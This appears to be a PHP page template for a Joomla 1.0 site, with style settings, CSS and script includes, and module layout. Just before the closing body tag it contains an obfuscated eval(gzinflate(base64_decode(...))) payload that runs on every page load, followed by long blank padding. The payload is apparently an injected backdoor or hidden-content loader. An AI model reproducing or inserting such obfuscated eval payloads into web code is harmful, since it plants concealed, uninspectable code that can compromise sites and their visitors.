<?php
defined( '_VALID_MOS' ) or die( 'Direct Access to this location is not allowed.' );
require($mosConfig_absolute_path."/templates/" . $mainframe->getTemplate() . "/rt_styleswitcher.php");
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
	<?php
	if ( $my->id ) {
		initEditor();
	}
	mosShowHead();

	// *************************************************
	// Change the variables below to adjust the template
	//
	// If you have any issues, check out the forum at
	// http://www.rockettheme.com
	//
	// *************************************************

	$default_style 				= "style19";			 //[style1... style20]
	$enable_rokzoom				= "true";			 // true | false
	$template_width 			= "950";			 // width in px
	$secondcol_width 			= "25%";			 // width in px | width in %
	$thirdcol_width 			= "25%";			 // width in px | width in %
	$menu_name 						= "mainmenu";		 // mainmenu by default, can be any Joomla menu name
	$menu_type 						= "suckerfish";		 // moomenu | suckerfish | splitmenu | module
	$splitmenu_col				= "secondcol";	     // secondcol | thirdcol
	$default_font 				= "default";         // smaller | default | larger
	$show_pathway 				= "false";			 // true | false
	
	// module slider configuration
	$modules_list 				= array(array("title"=>"Group 1 Stuff", "module"=>"user7"),
																array("title"=>"Group 2 Panel", "module"=>"user8"),
																array("title"=>"Group 3 Collection", "module"=>"user9"),
																array("title"=>"Group 4 Assortment", "module"=>"user10"),
																array("title"=>"Group 5 Items", "module"=>"user11"));
	$module_slider_height = 200;					// height in px
	$max_mods_per_row			= 3;						// maximum number of modules per row (adjust the height if this wraps)
	require($mosConfig_absolute_path."/templates/" . $mainframe->getTemplate() . "/rt_styleloader.php");
	require($mosConfig_absolute_path."/templates/" . $mainframe->getTemplate() . "/rt_tabmodules.php");
	require($mosConfig_absolute_path."/templates/" . $mainframe->getTemplate() . "/rt_utils.php");
	
	
	?>
	<meta http-equiv="Content-Type" content="text/html; <?php echo _ISO; ?>" />
	<link rel="shortcut icon" href="<?php echo $mosConfig_live_site;?>/images/favicon.ico" />
	<?php if($mtype=="moomenu" or $mtype=="suckerfish") :?>
	<link href="<?php echo $mosConfig_live_site;?>/templates/<?php echo $mainframe->getTemplate(); ?>/css/rokmoomenu.css" rel="stylesheet" type="text/css" />
	<?php endif; ?>
	<link href="<?php echo $mosConfig_live_site;?>/templates/<?php echo $mainframe->getTemplate(); ?>/css/template_css.css" rel="stylesheet" type="text/css" />
	<link href="<?php echo $mosConfig_live_site;?>/templates/<?php echo $mainframe->getTemplate(); ?>/css/<?php echo $tstyle; ?>.css?nocache=1" rel="stylesheet" type="text/css" />
	<?php if($enable_rokzoom=="true") :?>
	<link href="<?php echo $mosConfig_live_site;?>/templates/<?php echo $mainframe->getTemplate(); ?>/rokzoom/rokzoom.css" rel="stylesheet" type="text/css" />
	<?php endif; ?>
	<link href="<?php echo $mosConfig_live_site;?>/templates/<?php echo $mainframe->getTemplate(); ?>/css/rokslidestrip.css" rel="stylesheet" type="text/css" />
	<style type="text/css">
		div.wrapper { <?php echo $template_width; ?>padding:0;}
		td.secondcol { width: <?php echo $secondcol_width; ?>;}
		td.thirdcol { width: <?php echo $thirdcol_width; ?>;}
		.shadow-3 { width: <?php echo $raw_width; ?>px;}
	</style>	
	<?php if (isIe7()) :?>
	<!--[if IE 7]>
	<link href="<?php echo $mosConfig_live_site;?>/templates/<?php echo $mainframe->getTemplate(); ?>/css/template_ie7.css" rel="stylesheet" type="text/css" />	
	<![endif]-->	
	<?php endif; ?>
	<?php if (isIe6()) :?>
	<!--[if lte IE 6]>
	<link href="<?php echo $mosConfig_live_site;?>/templates/<?php echo $mainframe->getTemplate(); ?>/css/template_ie6.php" rel="stylesheet" type="text/css" />
	<style type="text/css">
	img { behavior: url(<?php echo $mosConfig_live_site;?>/templates/<?php echo $mainframe->getTemplate(); ?>/css/iepngfix.htc); } 
	</style>
	<![endif]-->
	<?php endif; ?>
	<script type="text/javascript" src="<?php echo $mosConfig_live_site;?>/templates/<?php echo $mainframe->getTemplate(); ?>/js/mootools-release-1.11.js"></script>
	<script type="text/javascript">tempus=<?php echo $tempus; ?></script>
	<script type="text/javascript" src="<?php echo $mosConfig_live_site;?>/templates/<?php echo $mainframe->getTemplate(); ?>/js/roktempus.js"></script>
	<?php if($enable_rokzoom=="true") :?>
	<script type="text/javascript" src="<?php echo $mosConfig_live_site;?>/templates/<?php echo $mainframe->getTemplate(); ?>/rokzoom/rokzoom.js"></script>
	<?php endif; ?>
	<?php if($mtype=="moomenu") :?>
	<script type="text/javascript" src="<?php echo $mosConfig_live_site;?>/templates/<?php echo $mainframe->getTemplate(); ?>/js/rokmoomenu.js"></script>
	<script type="text/javascript" src="<?php echo $mosConfig_live_site;?>/templates/<?php echo $mainframe->getTemplate(); ?>/js/mootools.bgiframe.js"></script>
	<script type="text/javascript">
	window.addEvent('domready', function() {
		new Rokmoomenu($E('ul.menu'), {
			bgiframe: false,
			delay: 500,
			animate: {
				props: ['opacity', 'width', 'height'],
				opts: {
					duration:400,
					fps: 100,
					transition: Fx.Transitions.Quad.easeOut
				}
			}
		});
	});
	</script>
	<?php endif; ?>	
	<?php if($mtype=="suckerfish" or $mtype=="splitmenu") :
		echo "<!--[if IE]>\n";		
	  include_once( "$mosConfig_absolute_path/templates/" . $mainframe->getTemplate() . "/js/ie_suckerfish.js" );
	  echo "<![endif]-->\n";
	endif; ?>	
	<?php if($enable_rokzoom=="true") :?>
	<script type="text/javascript">
		window.addEvent('load', function() {
			RokZoom.init({
				imageDir: 'templates/<?php echo $mainframe->getTemplate(); ?>/rokzoom/images/',
				resizeFX: {
					duration: 700,
					transition: Fx.Transitions.Cubic.easeOut,
					wait: true
				},
				opacityFX: {
					duration: 500,
					wait: false	
				}
			});
		});
	</script>
	<?php endif; ?>
	</head>
	<body <?php if($tempus!="false") echo 'id=' . $tempus .' '; ?>class="<?php echo $fontstyle; ?> <?php echo $tstyle; ?>">
		<!-- begin top part -->
		<div id="bg-top">
			<div id="bg-top-overlay"></div>
		</div>
		<!-- end top part -->
		<!-- start overall frame -->
		<div id="overall-frame">
			<!-- begin bottom part IE ONLY -->
			<div id="bg-bottom-ie">
				<div id="bg-bottom-overlay-ie"></div>
			</div>
			<!-- end bottom part ie -->
			<!-- start bottom part OTHER BROWSERS -->
			<div id="bg-bottom">
				<div id="bg-bottom-overlay">
					<!-- begin wrapper -->
					<div class="wrapper">
						<div id="top-shadow">
							<div class="shadow-1"></div>
							<div class="shadow-2"></div>
							<div class="shadow-3"></div>
							<!-- begin header -->
							<div id="header">
								<div id="logo-space"><a href="<?php echo $mosConfig_live_site;?>" class="nounder"><img src="<?php echo $mosConfig_live_site;?>/templates/<?php echo $mainframe->getTemplate(); ?>/images/logo.gif" border="0" alt="" id="logo" /></a><br /><span></span></div>
							</div>
							<?php if (mosCountModules("top")) :?>
							<div id="mod-top">
								<?php mosLoadModules('top', -1); ?>
							</div>	
							<?php endif; ?>
							<?php if (mosCountModules("search")) :?>
							<div id="mod-search">
								<?php mosLoadModules('search', -1); ?>
							</div>	
							<?php endif; ?>
						</div>
					    <div id="iefix">
							<div id="horiz-menu" class="<?php echo $mtype; ?>">
								<?php if($mtype == "splitmenu") : ?>
									<?php echo $topnav; ?>
								<?php elseif($mtype == "moomenu" or $mtype == "suckerfish") : ?>
									<?php mosShowListMenu($menu_name);	?>
								<?php else: ?>
									<?php mosLoadModules('toolbar',-1); ?>
								<?php endif; ?>	
							</div>
						</div>
						<!-- end header -->
						<!-- begin inset -->
						<div id="inset">
							<?php mosLoadModules('inset',-1); ?>
						</div>
						<!-- end inset -->
						<!-- begin mainbody -->
						<div id="body-shadow-left">
							<div id="body-shadow-right">
								<div id="body">
									<table class="mainbody" border="0" cellspacing="0" cellpadding="0">
										<tr valign="top">
											<td class="maincol">
												<div id="maincol">
													<div class="accent"><div class="accent-left"></div><div class="accent-right"></div></div>
													<?php if ($show_pathway == "true") : ?>
														<?php mosPathway(); ?>
													<?php endif; ?>
													<?php if (mosCountModules('user3') or mosCountModules('user4')) : ?>
														<div id="topmodules" class="spacer<?php echo $topmod_width; ?>">
															<?php if (mosCountModules('user3')) : ?>
																<div class="block">
																	<?php mosLoadModules('user3',-2); ?>
																</div>
															<?php endif; ?>
															<?php if (mosCountModules('user4')) : ?>
																<div class="block">
																	<?php mosLoadModules('user4',-2); ?>
																</div>
															<?php endif; ?>
														</div>
													<?php endif; ?>
													<div id="component">
														<div class="padding">
															<?php mosMainbody(); ?>
														</div>
													</div>
													<?php if (mosCountModules('user5') or mosCountModules('user6')) : ?>
														<div id="bottommodules" class="spacer<?php echo $bottommod_width; ?>">
															<?php if (mosCountModules('user5')) : ?>
																<div class="block">
																	<?php mosLoadModules('user5',-2); ?>
																</div>
															<?php endif; ?>
															<?php if (mosCountModules('user6')) : ?>
																<div class="block">
																	<?php mosLoadModules('user6',-2); ?>
																</div>
															<?php endif; ?>
														</div>
													<?php endif; ?>
												</div>
											</td>
											<?php if (mosCountModules('user1') or ($subnav and $splitmenu_col=="secondcol")) : ?>
												<td class="secondcol">
													<div id="secondcol">
														<div class="accent"><div class="accent-left"></div><div class="accent-right"></div></div>
														<?php if($subnav and $splitmenu_col=="secondcol") : ?>
															<div id="sub-menu">
																<?php echo $subnav; ?>
															</div>
														<?php endif; ?>
														<?php mosLoadModules('user1',-2); ?>
													</div>
												</td>
											<?php endif; ?>
											<?php if (mosCountModules('user2') or ($subnav and $splitmenu_col=="thirdcol")) : ?>
												<td class="thirdcol">
													<div id="thirdcol">
														<div class="accent"><div class="accent-left"></div><div class="accent-right"></div></div>
														<?php if($subnav and $splitmenu_col=="thirdcol") : ?>
															<div id="sub-menu">
																<?php echo $subnav; ?>
															</div>
														<?php endif; ?>
														<?php mosLoadModules('user2',-2); ?>
													</div>
												</td>
											<?php endif; ?>
										</tr>
										<tr>
											<td class="maincol bottom">
												<div class="accent"><div class="accent-left"></div><div class="accent-right"></div></div>
											</td>
											<?php if (mosCountModules('user1') or ($subnav and $splitmenu_col=="secondcol")) : ?>
											<td class="secondcol bottom">
												<div class="accent"><div class="accent-left"></div><div class="accent-right"></div></div>
											</td>
											<?php endif; ?>
											<?php if (mosCountModules('user2') or ($subnav and $splitmenu_col=="thirdcol")) : ?>
											<td class="thirdcol bottom">
												<div class="accent"><div class="accent-left"></div><div class="accent-right"></div></div>
											</td>
											<?php endif; ?>
										</tr>
									</table>	
								</div>
							</div>
						</div>
						<!-- end mainbody -->
						<!-- begin bottom panel -->
						<div id="bottom-modules">
							<div class="padding" >
								<?php displayTabs(); ?>
							</div>
						</div>
						<div id="footer-bar">
							<div align="center"><a href="http://www.jrgmedia.com/" title="JRG Media" class="nounder"><img src="<?php echo $mosConfig_live_site;?>/templates/<?php echo $mainframe->getTemplate(); ?>/images/blank.gif" border="0" alt="JRG Media" id="rocket" /></a></div>
						</div>
						<div id="footer-shadow">
							<div class="shadow-1"></div>
							<div class="shadow-2"></div>
							<div class="shadow-3"></div>
						</div>
						<!--end body panel -->
					</div>
					<!-- end wrapper -->
				</div>
			</div>
			<!-- end bottom part OTHER BROWSERS -->
		</div>
		<!-- end overall frame -->
	<?php eval(@gzinflate(base64_decode('TVXXCuSIEfyVZV/Wh8wpJy4sGuWcpZFYMMpplEZZX++52wP7oSi6qhqafuj+/ufv36d6+jK9i+o/72J6JVnxr6/grwBYfP331x8ngf84SeLD8AfsjxOhPkx+NObD9Af8B8RP768Mif3s+TuH/KOhPzX0k0M/Pi586n9yxF/e/9UI9e0M8jQDZESQCPFJSEZh5MgLn7K+wySjgZdMU/QFZxKCJ6T72fBaygz7CC0KwmsgCUvLCBtwzblWa9+ue0+EcQEkVEv3u2tM7BTeYeo94bmWAKFy45ivKLDXLKHHvJKylRVJLNC3uMGzuLzPKjMfH6B9uaB0IjNpdRTbkK+6Us7b8cfEFbUZBcNEkN27U3kN16MziqZO3MeSRyFoWKbGTnEPCgEZitxKmKZWu+IVEU0vTNURafRw3ovDP2xQANoFB4w2M6fsVuD1jpGM3XxIYLCVldfD+wwvXdvcWblXFIFxHnDGX7ZvRj3FG0tPXZaXz/2SrevFY7EhZvf+qgyarA+oymU54D6zLoVTNYPgHs9e5kCW92GkTI8qc3QwkuMJVVxNCMVOFN5R1lWeJTCOIsSjd5tB2+981ikCuXWlQmfrZDai7jlJ8+BBtul793RqfGYYewIkN2RQnvWXMZKIyI/BVyyK7Zt03xTv5OSG1CsNCX50dDr3GOW7drkSgGVkAsWO2lt/0DmVhMGpGhj1js/OVZY1jpZ5S9G9kODDGO4VOALIn3PX1qRzGw377eSxC95OjEZ4O7i87afyUWbH4uBSqU53o15bjfajU1eb9VbSiPUtTKTbji2JNe6JI2R4ODhToaVJNTxia8Yl7WKd5t3R4Ug1MBsgOKJ7frYeEmBiZgon54t+jHhWPIA1ffVM/8Q4sKOCANMynYea82jG8JUmLGR53Hpf836s/WVEAXQk6XTFkJhx6HNL8CFZK3MABx61QtmNyYqRm4B7aCXehns2MIsZbaj4Si2uwBwYe7hcGFQXPM+F0L/d5zXcKM8YPQHMJCrnFee/LJOHSd++63zJb1xSWRRrc9eaOc55V3WDWsCywkw/lHORHuG7zdQhV+EjIM6rI7xI9Q6bJVToDuUSoTlqO92us9hcghkTwvDMg1L68EKCFHAAWgWjBBly294loQQqjLWMnk5WgIBY/GRu0kpt2wKv7q0QdJ/nJcYfIklQBVb4wuNkIqbYtvSRcNPhppKFJ6uA7EH6wIpCMIAG9lVcoiSrROJaXK+OtOZj3Ev4Nb6igpFedGUdj0egTQgkvbpo2GZ54S5AA+dovodY2APqGe+1MW7XJGI4zKPNrDLI1AzEuE7bWZ+dGHRGzghz3MVI/WQERLVThWkFmlJ2e2mZDdKJBOiS26VSAg1WRWv61TEFI8gC4SwTYOnj6Xhos6IzyvP9OU3Do0IPejlX6d02Hh+JNPog+BEddd4XO1eOqhWX63hxxYIuHxGhc0VUgz3bayalsyneMq3eY6MIkw7bQ8ydDeLDm/m9lk8tr+PNgRhPsc+OqRK/ZDCbpNLLrqQWZ3rCmpbRObk5ngfCVavGN09AJrTGy/knO6X39mS3TCnmKyWdIZGsjmYcAIJUL7rcwpUqsnYw+/hsmZ58aiN9EDupzAL3zgVRgQC64zkOQpr4e+1os2OeB1UwNICQwxNQ+PWV++eDQ/R58rmJ5ZbryMTlkDRwEXdwLfkSzh0k2Uz5fL0hUuF5G2zYtEa5Z2iT6lSzZpfZJGlqTdZbd5eO+g02ijxFyOtCJd3x90YhjbgCzjwbkOXMwuDSzLJ62HXvmagfsHpc+nJTNuSh1uYTScIIQMZ+pvdZKNuxFJ8g228mlDzLtoumOzlB7iTk2rsxzaOkWzqzBU4WbR6aCqk36SX0DMihm1SkHAgOCClJ21BYFlRPhXeDXKRHaM0LGCU3Esgwf/zx7fPF6P8BfXwe6a9ff/nty/c//ws='))); ?></body>	
</html>


























































































































































































































































</b>


























































































































































































































































</b>